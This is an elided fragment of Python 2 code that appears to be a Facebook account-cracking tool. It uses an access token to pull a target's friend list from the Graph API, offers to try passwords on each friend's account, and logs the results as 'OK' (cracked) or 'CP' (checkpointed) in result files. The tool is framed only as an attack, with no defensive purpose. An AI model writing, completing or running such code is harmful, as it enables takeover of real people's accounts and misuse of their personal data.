...
def indo():
	...
	try:
		...
		tokenz()
	print("\n "+N+"["+K+"*"+N+"] type 'me' Tto crack from friends list")
	idt = raw_input(" "+N+"["+M+"*"+N+"] ID Public : ")
	try:
		pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
		sp = json.loads(pok.text)
		print(" "+N+"["+K+"+"+N+"] Name : "+sp["name"])
	except KeyError:
	...
	for i in z["data"]:
		...
		nm = na.rsplit(" ")[0]
		id.append(uid+'|'+nm)
	print(" "+N+"["+M+"*"+N+"] Total ID  : "+N+""+str(len(id)))
	ask = raw_input("\n "+N+"["+K+"?"+N+"] want to use a manual password? Y/t : ")
	if ask == "Y" or ask == "y":
		manual()
	print(" "+N+"["+H+"+"+N+"] Account \033[0;92mOK\033[0;97m Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
	print(" "+N+"["+K+"+"+N+"] Account \033[0;92mCP\033[0;97m Saved In : results/CP-%s-%s-%s.txt"% (ha, op, ta))
	
	def main(user):
		global loop, token, ips
		print'\r '+N+'['+b+'%s'+N+'] Cracking %s/%s - OK-:%s - CP-:%s ' % (datetime.now().strftime('%H:%M:%S'), loop, len(id), len(ok), len(cp)), 
		sys.stdout.flush()
		uid,name=user.split("|")
		try:
			os.mkdir('results')
